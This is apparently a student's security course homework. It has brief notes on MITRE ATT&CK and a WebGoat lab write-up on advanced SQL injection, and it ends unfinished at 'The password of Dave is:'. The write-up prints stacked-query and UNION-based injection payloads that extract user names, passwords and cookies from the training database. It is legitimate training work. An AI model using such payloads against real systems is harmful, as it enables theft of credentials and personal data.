Task 1:

I decided to create another repository with useful vocabulary and definitions that will be extremelly useful for me during the entire class. 

The link is:
https://github.com/AikateriniT/SECURITY-VOCABULARY
____________________________________________________________________________________________
x) Read and summarize (This subtask x does not require tests with a computer. Some bullets per article is enough for your summary, feel free to write more if you like)

    € Costa-Gazcón 2021: Practical Threat Intelligence and Data-Driven Threat Hunting 
    Chapter 4: Mapping the Adversary (all but "Testing yourself", which is left as voluntary bonus)'
    
Chapter 4: Mapping the Adversary.

In the 4th chapter the author explains how to work with the MITRE ATT&CK Framework, and making reports on the topics: - The ATT&CK Framework - Mapping with ATT&CK - Testing ourselves


____________________________________________________________________________________________




____________________________________________________________________________________________
y) Write an answer with references (this subtask does not require tests with a computer). Answer in the context of Mitre Att&ck, and pick examples that are different from the chapter in task x.
Define tactic and give an example.
Define technique and subtechnique, and give an example of each.
Define procedure, and give an example of each.
____________________________________________________________________________________________

WebGoat - Injection (advanced)

The goals of this part is to teach the more advanced topics for an SQL injection by combining SQL injection techniques and the Blind SQL injection.

Task 3: Pulling data from other tables.

    CREATE TABLE user_data (userid int not null,
                           first_name varchar(20),
                           last_name varchar(20),
                           cc_number varchar(30),
                           cc_type varchar(10),
                           cookie varchar(20),
                           login_count int
                           );
                           
    CREATE TABLE user_system_data (userid int not null primary key,
                                              user_name varchar(12),
                                              password varchar(10),
                                              cookie varchar(30)
                                              );
 
6.a) Retrieve all data from the table
 
6.b) When you have figured it out... What is Dave's password?
 
For the first attempt we should try chaining and for the second attempt we should try the UNION. From the creation of the tables we already know that they are susceptible to SQL injection. For the chaining we have to think, that we don't know any name from the table (';), then we want to print all the columns included (SELECT *) inside the user_system_data (FROM user_system_data; --) 
So, as a solution we have the:

        '; SELECT * FROM user_system_data; --
        SELECT * FROM user_system_data WHERE last_name = "; SELECT * FROM user_system_data; --
        (that is the query)
        
![1](https://user-images.githubusercontent.com/113516460/217308072-1d4fd3c0-19c4-449f-8f38-a008d4ea7d68.JPG)

Then we will try to figure out how to do it by using UNION. 

    By following the syntax of UNION provided from the last task we do like that:
    ' UNION SELECT 1, user_name, password, cookie, 'A','B', 1 FROM user_system_data;--
    SELECT * FROM user_data WHERE last_name = "UNION SELECT 1, user_name, password, cookie, 'A','B', 
    1 FROM user_system_data;--
    
    
    Hint! he datatype of the first column in the first SELECT statement, must catch the datatype of the first 
    column in the second(third, fourth..) SELECT stetement. The same applies to all other columns. 
    
    The password of Dave is: 
